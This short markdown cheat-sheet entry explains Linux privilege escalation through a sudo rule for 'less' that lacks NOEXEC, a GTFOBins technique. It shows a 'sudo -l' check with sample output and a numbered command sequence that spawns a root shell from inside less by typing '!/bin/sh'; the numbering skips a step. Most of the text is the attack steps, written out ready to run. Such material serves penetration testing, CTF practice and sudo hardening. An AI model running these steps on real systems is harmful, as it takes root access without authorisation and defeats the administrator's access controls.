If a limited user can `sudo less`, and the admin forgot to add the `NOEXEC`, he can elevate to root leveraging a "GTFOBin" technique.

## check

````shell
$ sudo -l

User may run the following commands on:
    (ALL) NOPASSWD: /bin/less
````


## sequence

To get a root shell using sudo less, execute the following:

1. type `whoami`
2. run `sudo less /etc/profile`
4. copy-paste: `!/bin/sh` and press Enter
5. run `clear`
6. run `bash`
7. run `whoami`
